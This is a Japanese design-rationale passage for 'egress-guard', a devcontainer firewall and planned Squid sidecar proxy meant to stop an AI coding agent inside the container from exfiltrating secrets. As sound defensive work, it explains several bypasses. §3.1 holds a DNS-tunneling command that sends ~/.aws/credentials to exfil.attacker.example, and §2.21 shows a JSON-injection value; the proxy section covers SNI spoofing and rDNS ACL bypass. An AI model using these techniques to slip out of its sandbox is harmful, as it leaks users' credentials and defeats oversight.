現在は `Dockerfile` がパッケージ導入の全てを担っています（`iptables` 等の apt 導入、スクリプトの `/usr/local/bin` への配置、`firewall.json` の `/etc/egress-guard` への配置、sudoers の生成）。これを Feature にすれば、導入側の `Dockerfile` を短くできます。

#### Feature 側に移せるもの

`Dockerfile` から次が消えます（約 25 行）。

* apt 導入の `iptables` / `ipset` / `iproute2` / `dnsutils` / `aggregate` / `jq`
* `COPY init-project-firewall.sh` と `chown` / `chmod`
* sudoers の生成
* `USER root` ↔ `USER node` の往復（Feature はイメージビルド後に root で実行され、完了後に元の `USER` へ戻るため不要）

`devcontainer.json` からは次を Feature 側の宣言に移せます。

* `--cap-add=NET_ADMIN` / `NET_RAW` → Feature の `capAdd`
* `postStartCommand`

#### Feature 側に移せないもの

* **`initializeCommand`（`docker network create`）** — ホスト側で実行されるもので、Feature が宣言できるプロパティに含まれません
* **`--network=egress-guard-*`** — `runArgs` は Feature の宣言対象外です。Feature が宣言できるのは `init` / `privileged` / `capAdd` / `securityOpt` / `entrypoint` / `mounts` / `containerEnv` / `customizations` と各ライフサイクルフックに限られます
* **`waitFor: "postStartCommand"`** — 利用側の `devcontainer.json` での指定が必要です

つまり **`devcontainer.json` はほとんど短くなりません。得られるのは `Dockerfile` の簡略化だけです。**

#### `firewall.json` をどう渡すか

ここが本題です。プロジェクト固有の `firewall.json` を root 所有の固定パスへ置く方法（§2.1）が問題になります。

* **`install.sh` はワークスペースのファイルを読めません。** イメージビルド時に実行されるため、ワークスペースはまだマウントされていません。読めるのは Feature 自身のディレクトリの中だけです
* **Feature のライフサイクルフックはワークスペースを読めますが、`/etc` に書けません。** `onCreateCommand` 等はワークスペースがマウントされた状態で走りますが、`remoteUser`（= `node`）として実行されるためです

つまり「フックで repo の `firewall.json` を `/etc` へコピーする」という抜け道はありません。

**案 A: Feature の options で渡す**

```jsonc
"ghcr.io/<owner>/egress-guard:1": {
  "allowDomains": "chatgpt.com,api.openai.com",
  "mode": "enforce"
}
```

`install.sh` が `/etc/egress-guard/firewall.json` を生成します。書き込み経路の信頼モデルは現行と同等です（`devcontainer.json` も非特権ユーザーが書けますが、反映にはイメージ再ビルドが要ります）。

問題は**設定を受け取る経路が、テストの無いシェルスクリプトに移る**ことです。

* Feature の options は文字列と真偽値しか取れないため、配列はカンマ区切りに退化します。`install.sh` にカンマ区切り文字列から JSON を組み立てる処理が入ります
* その生成処理は**既存のテストスイートの対象外**です。`tests/firewall-config.test.sh` が守っているのは `read_config` から先だけで、その手前に新しいコード経路が増えます
* クォートを誤ると壊れます。`allowDomains` に `a.com","allowCidrs":["0.0.0.0/0` のような値を入れられたときに JSON 構造を破れないことを、`install.sh` 側で保証する必要があります。適用時の検証（`validate_cidr`、未知フィールド拒否）が最終的に弾くため致命傷にはなりませんが、**防御が 1 段だけになります**
* `--check-config` で事前に検証する経路も失われます

**案 B: ローカル Feature**

`./.devcontainer/features/egress-guard/` に置けばディレクトリごとコピーされるため `firewall.json` を同梱できます。ただし OCI 配布ができず、Feature 化の主目的である再利用性が失われます。

**案 C: ハイブリッド（採用するならこれ）**

Feature はスクリプト・依存パッケージ・sudoers だけを担い、`firewall.json` は導入側の `Dockerfile` が配置します。

```dockerfile
COPY firewall.json /etc/egress-guard/firewall.json
RUN chown -R root:root /etc/egress-guard && chmod 644 /etc/egress-guard/firewall.json
```

`Dockerfile` に 3 行残りますが 25 行が消えます。プロジェクト固有のポリシーがリポジトリ内の JSON のまま残るため、既存の検証・テスト資産をそのまま使えます。

**ただし案 C には穴があります。** Feature 側でスクリプト・sudoers・`postStartCommand` が揃うため、**導入側が `COPY firewall.json` を書き忘れても静かに動きます。** firewall は適用され、自己検証も通り、基底プロファイルだけの状態で正常起動します。プロジェクト固有の許可が全部消えていることに気づけません。

現在は README の 4 項目がセットで、どれか欠ければ実行できない（sudoers 無し）か、`no firewall.json found` が出ます。しかもこの行は WARNING ですらない `info` なので、Feature 化して「設定だけ欠けて他は揃っている」状態が作れるようになると、なおさら埋もれます。

#### 採用しない理由

* **セキュリティ機構を外部依存にすることになります。** 現在はスクリプトの実体がリポジトリにあり、差分で監査できます。OCI Feature の `:1` のような可変タグはサプライチェーン面を増やすため `@sha256:` でのピン留めが要りますが、ピン留めするとバージョン更新が手作業に戻り、Feature 化の利点が半減します

  具体的な帰結があります。`assert_script_is_root_owned`（§2.19）は `/usr/local/bin/init-project-firewall.sh` が root 所有であることしか見ず、**それが正しいスクリプトかは検証しません。** これは現在も同じですが、現在は「実体がリポジトリにあり差分で監査できる」ことが補っています。Feature 化するとその補いが消えます（§3.4 で「捕まえるのは設定ミスであって攻撃者ではない」と明記した検査の、有効範囲が狭まります）
* **設定の置き忘れが検出できなくなります**（案 C の穴。上記）
* **素の `docker build` では適用されません。** Feature は `devcontainer build` や VS Code の経路でのみ処理されます。CI が `docker build` でイメージを作ると、ファイアウォールの入っていないイメージが何の警告もなく出来上がります。fail-closed を旨とする設計と噛み合いません
* **二重管理になります。** `packages/egress-guard/scripts/` と Feature 内のコピーを同期するリリース手順が要ります
* 得られるのが `Dockerfile` 25 行の削減だけで、上記のコストに見合いません

### 2.22 sshd の INPUT 許可を opt-in にする（既定 22 の廃止）

**決定:** `firewall.json` に `sshdPort` が指定されたときだけ sshd 規則（INPUT の `NEW` 許可 + 対になる OUTPUT の `ESTABLISHED` 応答）を出す。既定値 `22` は廃止し、省略時は bootstrap・最終・panic のどのテーブルにも出さない。

**なぜ（1）— 特別扱いの根拠が消滅したため。** sshd 規則は、bootstrap テーブルにも panic テーブルにも入る唯一の inbound 許可として特別扱いされてきました。理由は「firewall 適用のどの中間状態でも、オペレータの制御チャネルを切らない」ことでした。

コンテナへの SSH は、その後**全経路が `docker exec` 上の `sshd -i`（inetd モード、listen ソケット無し）へ移行しました。** この経路はネットワークスタックを通らないため iptables の管轄外です。守るべき制御チャネルが filter テーブルの外に出た以上、特別扱いを続ける根拠がありません。**panic テーブルが loopback だけになっても、対話アクセスは失われません**（§2.8 の「設定読み込みより前に適用フェーズを始める」と組み合わさると、スキーマ違反で倒れた panic テーブルにはそもそも `sshdPort` の値が無いため、この点は既定値の有無にかかわらず成立している必要がありました）。

**なぜ（2）— INPUT は egress 規制の従属規則であるため。** egress-guard の本義はコンテナ内からの秘密送出の規制です。INPUT の default DROP は独立したサービス保護機能ではありません。inbound 接続を 1 本許すと、**以後その接続の上を流れる送信は conntrack の `ESTABLISHED` として扱われ、OUTPUT の allowlist を経由せずにデータを外へ出せます**（逆方向チャネル）。INPUT を閉じているのは、この抜け道を塞ぐためです。

したがって inbound を開けることは、**サービスを公開する判断ではなく egress の穴を 1 本受け入れる判断**です。既定で開いていてよい性質のものではありません。`sshdPort` の指定は、その受け入れの明示的な宣言になります。

**汎用の inbound 許可リストにしない理由。** 外から内へ入る必要が実際に生じる用途は事実上 SSH だけです。`allowInboundPorts` のような汎用 API にすると、**逆方向チャネルを気軽に開けるための道具**になります。用途を名前で限定した `sshdPort` のまま残すことで、「何のために開けるのか」が設定ファイルの字面に残ります。

**コスト:** breaking change です。listen する sshd を運用している利用者は `"sshdPort": 22` を明示する必要があります。移行手順は [`../CHANGELOG.md`](../CHANGELOG.md) と [`../README.md`](../README.md)。なお `sshdPort: 0` に「無効化」の意味は与えていません（従来どおり拒否されます）。無効化はキーを書かないことで表現します。
### 2.23 L7 proxy は sidecar コンテナに置き、TLS を終端しない

**決定:** [`spec.md`](./spec.md) §10.1 の L7 proxy を、ホスト側のプロセスではなく**同一 Compose プロジェクト内の sidecar コンテナ**に置く。proxy は TLS を終端せず、ClientHello の SNI と平文 HTTP の Host ヘッダだけで判定する（以下 **SNI-only**）。

これは §10.1 の初版が「ホスト側に proxy を置き」と書いていた記述を差し替える判断です。実装に着手する前に配置を確定させておかないと、後続の作業がすべてやり直しになるため、先に決めます。

#### なぜ初版が「ホスト側」だったか

根拠は §2.20 の却下理由、すなわち「**常駐する `CAP_NET_ADMIN` プロセスに、敵が選んだ入力を食わせ続けることになる**」でした。名前を見る層をコンテナの外へ出せば、その問題が逆向きに解決する、という筋です。

**この理由は SNI-only proxy には当てはまりません。** dnsmasq が `CAP_NET_ADMIN` を要求したのは **ipset へ書き込むからです**（§2.20 の `src/dnsmasq.c` の該当箇所）。SNI proxy は ipset を書きません。TCP を中継するだけで、ネットワーク特権を必要としません。§2.20 の「なぜ 1」は proxy には移らない、というのがこの節の出発点です。

したがって判断すべきなのは「コンテナの中か外か」ではなく、「**エージェントと同じ netns・同じ PID 空間に置くかどうか**」になります。

#### 配置の 3 案

**案 A: ホスト側プロセス**（§10.1 初版）

I1 の観点では最も強い配置です。一方で、**§1.4 で L3/L4 を選んだ理由そのものを壊します。** 「devcontainer に閉じて完結する」構成の利点は導入と検証のコストであり、ホスト側コンポーネントはそこを直撃します。macOS / Linux のホスト差、起動保証、バージョン整合が利用側の手順に乗ります。

**案 B: sidecar コンテナ**（採用）

別 netns・別 root・別 PID 空間です。エージェントのコンテナからは proxy のプロセスにも設定ファイルにも到達できません。**I1 の強度は案 A とほぼ同等です。** 導入は Compose の service を 1 つ足すだけで、devcontainer の内側に収まります。

**案 C: 同一コンテナ内の常駐プロセス**

導入は最も軽いですが、攻撃面が最大です。root で起動すれば `node` 権限から殺せず、設定を `/etc` の root 所有に置けば書き換えもできません（§2.1 と同じ手）。それでも **proxy の脆弱性がそのままコンテナ内の root になります。** 案 B が同じ強度を得られる以上、選ぶ理由がありません。

**案 B を採ります。**

#### 案 B の前提は既に揃っている

`.devcontainer/docker-compose.yml` が存在し、Compose 構成は実機検証済みで、README の第一推奨です（[`verification-record.md`](./verification-record.md) §6.22）。§4.5 の通り Compose はプロジェクトごとのユーザー定義ネットワークを自動で作るため、sidecar を同じネットワークに置くのは service の追加だけで済みます。**「Compose 化が必要になる」という障壁は既に存在しません。**

#### I1 — proxy 設定へエージェントが到達できないこと

proxy の ACL は、sidecar のイメージビルド時に焼き込むか、sidecar へ read-only で bind mount します。どちらの場合も**エージェントのコンテナのファイルシステムには現れません**。

§2.1 が `/etc` の所有権とパーミッションで作っていた境界が、ここではコンテナ境界そのものとして得られます。ポリシー変更にイメージ再ビルドが要る性質（I1）も変わりません。

#### I2 — proxy が落ちたら閉じる

縮小後の iptables は「proxy 宛 + DNS 固定のみ許可」です。proxy が落ちれば**外向きの通信は全て落ちます**。エージェントから proxy を停止する経路はありません（別コンテナであり、Docker ソケットは渡しません）。

**案 A と比べて有利な点があります。** ホスト側プロセスは利用者が起動し忘れる・止め忘れることがあり、そのとき現れるのは「起動しない devcontainer」です。sidecar なら `depends_on` で起動順が保証され、`docker compose down` で一緒に消えます。**proxy の生存が Compose プロジェクトのライフサイクルに一致します。**

#### 必須要件 1: SNI と実接続先の一致を proxy 側で強制する

§1.1 の通り、敵はコンテナ内のエージェントです。**SNI も `CONNECT` のホスト名も、敵が自由に書ける文字列です。**

透過型（DNAT）で proxy へ寄せる場合、proxy は `SO_ORIGINAL_DST` で元の宛先 IP を取得します。ここで **SNI に許可済みドメインを書き、接続先 IP を任意のものにする**攻撃が成立します。ACL 判定は名前で通り、パケットは攻撃者の IP へ届きます。allowlist が名前でしか判定しないことの裏返しです。

**塞ぐには、proxy が受け取った名前を自分で解決し直し、その結果へ接続する必要があります。** クライアントが指定した宛先 IP は使いません。これは proxy 実装を選ぶときの必須要件であり、満たせない実装は候補から外します。

#### 必須要件 2: 名前ベースの ACL に IP リテラルを持ち込ませない

必須要件 1 の裏口です。**名前で判定する層に移した結果、「名前」が攻撃者にも作れるものになる**、という形の穴があります。

Squid を例に取ると、`dstdomain` ACL は既定で **IP リテラル宛のリクエストに対して PTR 逆引きを行い、その結果をパターンと突き合わせます**（`src/cf.data.pre` の ACL 定義: "For dstdomain and dstdom_regex a reverse lookup is tried if a IP based URL is used and no match is found"）。

これが開いていると、**敵は自分が管理する IP の rDNS を許可済みドメイン名に設定するだけで ACL を通せます。** そのうえで接続先はその IP リテラルのままです。必須要件 1 を満たす実装でも、この経路は別に塞ぐ必要があります。

**IP リテラルの宛先はどのドメイン ACL にもマッチさせず、既定 deny に落とすこと。** Squid では `dstdomain` に `-n` を付けると、型が一致しない照合を「即座に不一致」として扱います。**この指定は必須です。**

#### 必須要件 3: ECH は「拒否する」のではなく、判定材料から外す

**当初この項目は「ECH（Encrypted ClientHello）付きの ClientHello を拒否する」と書いていました。2 つの点で誤りだったため差し替えます。**

**誤り 1: ECH でも平文の SNI は消えません。** `draft-ietf-tls-esni` は ClientHelloOuter について「`ECHConfig.contents.public_name` の値を `server_name` 拡張に入れる（SHOULD）」と定めています。ECH が使われても SNI は存在し、**SNI-only proxy から見ればごく普通のホスト名に見えます。** 判定材料が消えるのではなく、**判定材料が本当の宛先を指さなくなります。** §2.10 で「正しく解決できたようにしか見えない」形を最悪としたのと、同じ形です。

**誤り 2: 「拒否する」を表現できる実装がありません。** nginx の `ngx_stream_ssl_preread_module` は SNI・ALPN・supported_versions の 3 つの拡張しか処理せず、それ以外は読み飛ばします。Envoy の `tls_inspector` にも HAProxy にも `encrypted_client_hello`（`0xfe0d`）を判定する手段がありません（HAProxy 3.3 の `ech` は復号用の experimental であり、判定用の sample fetch ではありません）。

**帰結: 透過型 SNI proxy は ECH の下で allowlist が静かに無効化され、それを検出する手段が既存実装に存在しません。**

**明示型を採ると、この論点自体が消えます。** 接続先は proxy が `CONNECT` の authority を自分で解決した結果で確定しており、その TCP コネクションの中を流れる TLS が ECH かどうかは接続先を変えません。ECH は判定材料に一切関与しなくなります。

これは次節を決める理由でもあります。

#### 決定: 明示型（`HTTP_PROXY` / `HTTPS_PROXY` と `CONNECT`）

当初は未決として置き、着手条件を「proxy 設定に従わないツールの実測」としていました。**実測が済み、明示型で確定しました。**

* **明示型を採る決め手は必須要件 3 です。** 透過型では ECH の下で allowlist が無効化され、しかもそれを検出できません。**これは受容できる残余リスクではなく、制御そのものが成立しなくなる性質です**
* あわせて、明示型なら §2.4「nat を触らない」を維持でき、必須要件 1 が構造的に満たされます（proxy が受け取るのは `CONNECT host:port` の文字列だけで、宛先 IP は proxy 自身の解決結果しかありません）
* **透過型は §9.7 を再導入します。** Squid の透過モードは SNI の解決結果と元の宛先 IP を照合するため、**CDN が TTL ごとに IP を回すと誤検知します**（Squid wiki が運用注意として明記）。今回の移行は §9.7 を解くためのものなので、本末転倒になります

**明示型の弱点は「proxy 設定に従わないツールの通信が落ちる」ことです。** これは実測しました。**従わないのは 2 つだけです。**

* **`git over ssh`** — `ssh_config(5)` に `HTTP_PROXY` を読む記述はありません。`ProxyCommand` で `CONNECT` に載せれば、**迂回ではなく proxy の同じ ACL の下に入ります**（`CONNECT github.com:22`）。`url.https://github.com/.insteadOf` での書き換えも代替になります
* **Node の `fetch`（undici）** — 既定 OFF の opt-in です。`NODE_USE_ENV_PROXY=1`（Node 22.21.0 / 24.0.0 以降）を環境変数に置けば解決します

`git`（https）・`curl`・`apt`・`npm`・`pnpm`・Claude Code はいずれも従います。**ただし大小文字の規則が揃っていません。** `curl` は `http_proxy` を小文字でしか読まず、`apt` も小文字のみです。**大文字と小文字の両方を必ず設定します。**

**VS Code Server の拡張ダウンロードが従うかは未確認です。** 公式ドキュメントが「リモートホストで `HTTP_PROXY` / `HTTPS_PROXY` を設定せよ」と案内している一方、gallery クライアントがそれを読むという明文が見つかりませんでした。**この移行の主目的の一つが拡張の配信 CDN（[`known-issues.md`](./known-issues.md) #7）である以上、着手前に実測すべき最優先項目です。**

#### 明示型を実測して分かったこと

PoC の作成過程で、この devcontainer 内に自前の TCP リスナを立てて実測しました（外向き通信は発生していません）。

* **必須要件 1 が明示型で構造的に満たされることの裏付けが取れました。** `curl --resolve` は `CONNECT` のトンネル先には効かず、`CONNECT deb.debian.org:443` として名前がそのまま飛びます。**明示型では、クライアント側の操作だけで「名前は A だが接続先は B」という状態を作れません。** 残る攻撃経路は必須要件 2 の PTR 逆引きだけです
* **`no_proxy` / `NO_PROXY` に `localhost` と `127.0.0.1` を入れるのは必須です。** `HTTPS_PROXY` を広く設定すると、**Claude Code がループバック宛に出す内部通信（hook 通知）まで proxy へ流れます。** 外部 API のためだけの設定ではありません
* **`pnpm config set proxy` は効きません。** pnpm が読むのは環境変数です。設定キー経由で proxy を指定しても直接接続が成立してしまいます。**環境変数で渡すこと**が前提になります

#### 実装候補: Squid（明示型 `CONNECT`、`ssl_bump` なし）

**まだ実測していません。** 一次情報の調査で必須要件 1〜3 を満たすことまでを確認した段階です。PoC を通るまで確定とはしません。

採る理由:

* **`.example.com` の 1 行が apex とサブドメイン全体を覆います。** `firewall.json` の `allowDomains` をほぼそのまま変換できます（Envoy の `*.foo.com` や tinyproxy の fnmatch は apex を含まないため 2 行必要になります）
* **`ssl_bump` を書かなければ ClientHello を一切パースしません。** 「残るリスク」に挙げた「パース対象を最小に保つ」条件を、**ClientHello パーサすら持たない**形で満たします
* **fail-closed が二重です。** 設定エラーは `fatalf()` で即死し、`http_access` は「アクセス行が無ければ deny」が既定です
* **`squid -k parse` が現行の `--check-config`（§2.18）にそのまま対応します**
* **管理系ポートが既定で閉じています。** `icp_port` / `snmp_port` / `htcp_port` はいずれも既定 0 です。cache manager は独立ポートではなく `http_port` 上のインバンドのため、`http_access deny manager` で塞ぎます（**この 1 行で十分かは未検証**）
* **拒否ログにドメイン名が残ります。** 既定の logformat の `%ru` に `CONNECT host:port` が入るため、`audit` モードでの収集を現行の ipset 記録より高い情報量で引き継げます（時刻・許可分も残ります）

**正直なマイナス点:**

* **Docker Official Image が存在しません。** 自前ビルドと digest でのピン留めが要ります。§2.21 で Feature 化を却下した理由（サプライチェーン面が増える）と同じ問題が、ここでは避けられない形で現れます
* **CVE の実績が良くありません。** GitHub Security Advisories は 41 件（うち critical 12）です。**大半は FTP gateway・ICP・cache digest といった本構成で使わない機能ですが、バイナリには入っています。** 「残るリスク」の「敵が選んだ入力を食う常駐パーサ」が、この選択で最大化します
* Squid は本来キャッシュのため、`cache deny all` で「キャッシュしない」を明示する必要があります

**次点は Go の自前実装です。** `net.Dial` 以外に宛先を渡す API 面が無いため必須要件 1 が構造的に満たされ、IP リテラルの authority を明示的に拒否するところまで書けます。攻撃面も最小です。採らなかったのは、JS のモノレポに Go の保守コストを持ち込むためです。**Squid が PoC で落ちた場合の第一の代替として残します。**

**mitmproxy は候補から外しました。** `allow_hosts` / `ignore_hosts` が fail-open で、非該当ホストをブロックせず素通しするためです。

#### この移行で解けるものと、解けないもの

**SNI-only で解けるのは [`spec.md`](./spec.md) §9.1（ワイルドカード）と §9.7（CDN drift）です。** 実害が出ている 2 件（§9.7、[`known-issues.md`](./known-issues.md) #7）はどちらもここに含まれます。

解けないものを明記します。

* **§9.2（メソッド別・パス別制御）は解けません。** TLS を終端しないため、メソッドもパスも見えません。**§10.1 の初版はこれを解消として挙げていましたが、それは MITM proxy（TLS 終端）を前提とした記述でした。** SNI-only では成立しません
* **§9.4（DNS トンネリング）は強化に留まります。** proxy 側の名前 ACL で未許可名を潰せますが、許可済みドメインのサブドメインを使うトンネリングは残ります（§3.1 の機序は変わりません）
* **§3.2（許可先経由の低帯域 exfil）は残ります。** 許可先への `POST` は通ります

#### MITM proxy を採らない

**§9.2 を解くには TLS の終端が要りますが、採りません。**

* **GET と POST を分ける実益が乏しい。** §3.2 の通り `GET https://allowed.example/?data=<秘密>` は書き出しチャネルです。メソッドで分けても漏洩シンクの制限（§1.2 の目的 1）は強くなりません。§1.3 で「GET だけ全ドメイン許可」を却下したのと同じ理由です
* **proxy が秘密の集積点になる。** 全通信が proxy 上で平文になります。sidecar の侵害の被害が「allowlist の無効化」から「全通信の平文閲覧」へ跳ね上がります
* **証明書ピン留めをするツールが壊れます。** CA 証明書をコンテナへ配布する運用も増えます

要件が実在してから再検討します。現時点では要件が存在しません。

#### 残るリスク

* **敵が選んだ入力を食う常駐パーサであることは変わりません。** 案 B が消したのは「特権」と「同居」であって、「敵の入力を処理し続ける」ことではありません。**パース対象を `CONNECT` の authority と平文 HTTP のリクエスト行に限る（TLS を終端せず、ClientHello も読まない）ことが、攻撃面を最小に保つ条件です。** MITM を採らない理由がここでも効きます。明示型を採ったことで、対象は透過型 SNI proxy よりさらに狭くなります
* **sidecar は allowlist 全体を知っています。** proxy を落とせば通信は止まりますが、proxy を乗っ取れれば allowlist は無意味になります。エージェント権限からそこへ到達する直接の経路はなく、proxy 自身の脆弱性が必要です
* **同一 Compose ネットワーク上で sidecar に到達できます。** proxy 宛を許可する設計上これは前提ですが、**管理ポート・メトリクスポートを開かないことが条件です。** §4.4 で同居コンテナの `sshdPort` を問題にしたのと同じ形の穴になります

## 3. 受容した残余リスク

「対策しないと決めた」ものです。未解決のものは [`known-issues.md`](./known-issues.md) にあります。

### 3.1 DNS トンネリングは防げない

53 番の宛先はリゾルバ 1 つに固定していますが、**そのリゾルバは再帰問い合わせをします。**

```sh
dig "$(base64 < ~/.aws/credentials | tr -d '\n' | cut -c1-60).exfil.attacker.example"
```

問い合わせは正規のリゾルバへ向かい、リゾルバが上流へ転送し、攻撃者の権威ネームサーバーにラベルが届きます。TXT レスポンスで戻りチャネルも作れます。tcp/53 を許可しているため帯域も出ます。

**埋め込みリゾルバ `127.0.0.11` でも同じです。** Docker デーモンがホスト側の netns から上流へ転送するため、コンテナの OUTPUT チェーンは上流パケットを見ません。リゾルバの選択では解決しません。

得られている性質は「**経路の固定と、それ以外の試行の遮断・記録**」であって、トンネリングの遮断ではありません。README と仕様書が当初これを「DNS トンネリングの遮断」と書いていたのは過大主張で、「DNS 経路の固定」に訂正しました。

**受容の理由:** L3/L4 の範囲では原理的に届きません。§1.2 の目的は「漏洩先の限定」であり、「あらゆる低帯域チャネルの遮断」は Non-goal です。

**[`spec.md`](./spec.md) §10.1 の proxy 移行でも解消しません。** proxy 側の名前 ACL は未許可名を潰しますが、**許可済みドメインのサブドメインを使うトンネリングは残ります**（`<秘密>.allowed.example` のゾーンが攻撃者制御下にある場合）。完全な遮断には、応答ゾーンを allowlist に限定する DNS 層のコンポーネントが別に要ります。

### 3.2 許可先経由の低帯域 exfil

`GET https://allowed.example/?data=<秘密>` は防げません。書き込み権限を持つ GitHub トークンがあれば github.com 経由の持ち出しも可能です。

**受容の理由:** L3/L4 では HTTP メソッドもパスもクエリも見えません。対策は egress ではなくクレデンシャル側（prod キーをコンテナに置かない、fine-grained PAT を使う）で受け止めます。

### 3.3 適用前に確立された接続の継続

最終テーブルは `ESTABLISHED,RELATED` を ACCEPT するため（そうしないと通常の通信が成立しません）、**適用前に確立されていた allowlist 外への TCP 接続は継続できます**。

緩和が 2 つあります。

* **DNS だけは例外**（§2.6）
* **panic テーブルには OUTPUT の ESTABLISHED 許可がありません。** 失敗時は既存の接続も含めて遮断されます

**受容の理由:** `postStartCommand` はコンテナ起動直後、エージェントが動き出す前に実行されるため、実運用での影響は限定的です。

### 3.4 配置の検査は競合する攻撃者には勝てない

`assert_config_is_root_owned` は symlink・親ディレクトリ・所有者・モードを検査しますが、**検査と読み取りの間の差し替え（TOCTOU）は防げません**。ファイルは `stat` と複数回の `jq` でパス名から開き直されます。

閉じるには 1 つの fd を開いたまま全ての読み取りをそこから行う必要がありますが、**bash では表現できません**。

同様に、`assert_script_is_root_owned` は**悪意をもって差し替えられたスクリプトには無意味**です。差し替えた側が検査コードごと削除できます。

**受容の理由:** これらが捕まえる対象は**設定ミス**です。ワークスペースのファイルを bind mount で被せる、sudoers が `node_modules` を指す、といった誤りは確実に止まります。競合を成立させるには、まず親ディレクトリへの書き込み権限が必要で、`root:root` / `755` で配置していれば非特権ユーザーにその権限はありません。

**強くするなら:** §2.8 の「entrypoint で起動時点から閉じる」方式。検査の失敗が「開いたまま」に繋がる経路が消えます。

### 3.5 ポリシー変更にイメージ再ビルドが要る

§2.1 の直接の帰結です。`audit` モードで許可先を収集しながら `firewall.json` を育てるフェーズで、1 回の追記ごとに再ビルドが必要になります。

**受容の理由:** audit の収集は人間が回すフェーズであり、再解決（CDN の IP 変動への追随）は再適用だけで済むため、日常運用の頻度は上がりません。内容の検証だけなら `--check-config` で再ビルド不要です。

#### プロビジョニング中だけ audit にする運用は許容する

**決定:** コンテナ起動後のセットアップ（`apt-get install`、`node-gyp` のヘッダ取得など）のために、その間だけホスト側から `mode` を `audit` に落として再適用し、終わったら戻す運用を認める。**ただし手順は文書化しない。**

**手順を書かないのは意図的です。** これは遮断を一時的に無効化する操作であり、**このパッケージが推奨するのはあくまで「取得をイメージビルド時に移す」ほうです。** 窓を開ける必要があると自分で判断できる利用者は、実効設定が root 所有の JSON 1 つであることを知っていれば手順を組み立てられます。**コピーして貼れる形で置くと、第一選択がどちらなのかが読めなくなります。**

**その窓の間、コンテナは外へ出られます。** それでも許容するのは次の 3 つの理由です。

* **窓を開けるのは人間で、コンテナの外からです。** 実効設定を書き換えられるのは root だけなので、エージェント自身にこの窓は開けません（§2.1、I1）
* **窓が操作に紐づいています。** プロビジョニングが終われば閉じ直す前提であり、`audit` を常用する運用ではありません
* **`audit` でも保存される不変条件があります。** DNS 固定・IPv6・INPUT は締まったままで、遮断先の記録も続きます（[`spec.md`](./spec.md) §6.2）

**残るリスク: 戻し忘れを検出する仕組みはありません。** `audit` のまま残ると、以後の `docker start` でも `audit` で立ち上がります。スクリプト化して `trap` で復元する以上のことは、現行の実現層では用意できていません。

この運用で起動後セットアップが実際に成立することは実測しています（[`verification-record.md`](./verification-record.md) §2 の「起動後セットアップが成立する（プロビジョニング中だけ audit）」の行）。

## 4. 運用構成の判断根拠

**ここはこのパッケージの必須要件ではありません。** スクリプトは割り当てられたリゾルバを読んでどちらの構成でも動き、埋め込みリゾルバでなければ警告を出すだけです。ネットワーク構成は利用側の Docker / devcontainer の領分であり、推奨を示すに留めます。

### 4.1 リゾルバの選択で何が変わるか

Docker の埋め込みリゾルバ `127.0.0.11` は**ユーザー定義ネットワーク上でのみ**提供されます。デフォルトブリッジではホスト側の DNS アドレスが直接書かれます。

| | 許可される宛先 | パケットの行き先 |
|---|---|---|
| 埋め込みリゾルバ | `127.0.0.11:53` | **コンテナ自身の netns 内。eth0 から出ない** |
| ホストのリゾルバ | 例 `192.168.65.7:53` | **eth0 から実際に出る**。実在のネットワーク上のサービスに届く |

### 4.2 ホストのリゾルバを許可するとは何が起きることか

**「実在のネットワーク機器に、ポート 53 で到達できる経路が 1 本開く」**ということです。

情報の取得（内部名の列挙など）は、**埋め込みリゾルバでも同じように可能**です。どちらのリゾルバも上流へ転送するため `dig jenkins.corp.local` は両方で解決します。**リゾルバの選択で変わるのは到達性（実在の機器にパケットが届くか）だけです。**

その到達性がどれだけ問題になるかは、ホストの OS で大きく変わります。

**Docker Desktop（macOS / Windows）— 影響は小さい**

コンテナは Linux VM の中で動いており、`192.168.65.0/24` は **VM の内部ネットワーク**です。

* `192.168.65.7` — Docker Desktop の DNS フォワーダ（VM 内のサービス）
* `192.168.65.254` — `host.docker.internal`（ホスト OS 自身）

許可されるのは `.7` の 53 番だけで、**この相手は VM 内で DNS 転送しかしていないコンポーネント**です。物理 LAN 上の機器ではありません。「LAN に穴が開く」状態にはなりません。

**Linux ホスト — 影響は大きい**

VM が挟まりません。デフォルトブリッジでは、Docker が**ホストの `/etc/resolv.conf` の nameserver をそのままコンテナに書き込みます**。許可先は次のような**実在の機器**になります。

* `192.168.1.1` — 家庭用ルータ
* `10.0.0.53` — 社内 DNS サーバー
* VPN 接続中なら、その先の DNS サーバー

**サンドボックスから、その機器の 53 番に到達できる状態になります。** ポートは 53 に限られますが、その DNS 実装の脆弱性・動的更新・キャッシュポイズニングは射程に入り、「コンテナは LAN 上の機器と通信できないはず」という前提が崩れます。

`allowCidrs` は RFC1918 を拒否しますが、**`resolv.conf` 由来のリゾルバアドレスはこの検証を通りません**（通したら名前解決が成立しないため）。つまり **RFC1918 の実機に、意図的に穴を 1 つ開けています。** 埋め込みリゾルバならこの穴自体が不要になります。

加えて Linux ホストでは動作上の利点もあります。ホストが `systemd-resolved`（`127.0.0.53`）を使っている場合、デフォルトブリッジでは Docker がループバックを除外して **`8.8.8.8` / `8.8.4.4` にフォールバック**します。埋め込みリゾルバならデーモン経由でホスト本来のリゾルバが使われ、社内名の解決も期待どおり動きます。

### 4.3 埋め込みリゾルバのデメリット

一方向に優れているわけではありません。

* **ユーザー定義ネットワークが前提になる** — 作成の手間、アドレスプールの枯渇（Docker 既定では 30 個前後）、不要になったネットワークの掃除（`docker network prune`）
* **nat テーブルに Docker の DNS DNAT ルールが増える** — 本スクリプトは nat を触らないため共存します（§2.4 で実機確認済み）
* **同一ネットワーク上のコンテナ名が引ける** — 埋め込み DNS の本来機能。§4.4 で分離すれば影響は自分のスタック内に閉じます
* **Docker デーモンへの依存が 1 段増える** — デーモンの DNS 機能が壊れると名前解決が止まります
* **DNS の観測性はむしろ下がる** — ホストのリゾルバ宛なら、ホスト側で `tcpdump` してどのコンテナが何を問い合わせたか追えます。埋め込みリゾルバではデーモンが集約するため、コンテナ単位の帰属が取りにくくなります

### 4.4 ネットワークを共有すると守れないもの

**1 つのユーザー定義ネットワークを全プロジェクトで共有すると、同居するコンテナは相互に到達できます。** 埋め込み DNS が**コンテナ名で名前解決できてしまう**ためです。

egress-guard は大部分を守ります（相手の IP はブリッジのサブネット = RFC1918 で allowlist に載らないため REJECT）。ただし守れない面が残ります。

* **`sshdPort` を指定していれば、そのポートは INPUT で `NEW` を許可しています。** 同居する全コンテナから叩ける口になります（この口は同時に、OUTPUT の allowlist を迂回する逆方向チャネルでもあります。§2.22）。**既定では指定されていないため、この穴は開きません** — 指定するときはこの節を読んでからにしてください
* **firewall 適用前の窓** — `postStartCommand` 完了までは無防備です
* **egress-guard を入れていないコンテナ**が同居していれば、そちらは無制限です

